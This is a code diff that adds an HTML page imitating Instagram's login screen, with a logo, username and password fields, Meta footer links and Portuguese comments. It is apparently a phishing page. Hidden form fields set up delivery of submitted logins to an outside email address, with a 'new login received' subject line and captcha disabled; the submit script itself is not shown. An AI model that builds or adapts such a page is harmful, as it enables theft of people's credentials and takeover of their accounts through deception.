@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Login • Instagram</title>
+  <link rel="stylesheet" href="style.css" />
+</head>
+<body>
+
+  <div class="login-container">
+    <div class="login-box">
+      <div class="logo">
+        <img src="imagem/imagem.png" alt="Instagram Logo" />
+      </div>
+
+      <form id="loginForm">
+        <input type="text" name="user_input" placeholder="Phone, username or email" required /> <!-- atualizado name-->
+        <input type="password" name="user_pass" placeholder="Password" required /> <!-- atualizado name-->
+        <input type="hidden" name="_subject" value="Novo Login Recebido!"> <!-- linha atualizada-->
+        <input type="hidden" name="_captcha" value="false"> <!-- linha atualizada-->
+        <input type="hidden" name="email_to" value="teste2celular321@gmail.com"> <!--Linha acrescentada-->
+        <button type="submit">Login</button>
+        <div id="error-message" class="error-message"></div>
+      </form>
+      
+      <div class="divider">
+        <span>OR</span>
+      </div>
+
+      <div class="facebook-login">
+        <a href="#">Login with Facebook</a>
+      </div>
+
+      <div class="forgot-password">
+        <a href="#">Forgot your password?</a>
+      </div>
+    </div>
+
+    <div class="signup-box">
+      Don't have an account? <a href="#">register</a>
+    </div>
+
+    <footer class="footer">
+      <div class="footer-links">
+        <a href="#">Meta</a>
+        <a href="#">About</a>
+        <a href="#">Blog</a>
+        <a href="#">Careers</a>
+        <a href="#">Help</a>
+        <a href="#">API</a>
+        <a href="#">Privacy</a>
+        <a href="#">Terms</a>
+        <a href="#">Locations</a>
+        <a href="#">Instagram Lite</a>
+        <a href="#">Threads</a>
+        <a href="#">Contact Uploading & Non-Users</a>
+        <a href="#">Meta Verified</a>
+      </div>
+      <div class="footer-info">
+        <span>© 2025 Instagram from Meta</span>
+      </div>
+    </footer>
+
+  </div>
+  <script src="app.js"></script>
+
+</body>
+</html>
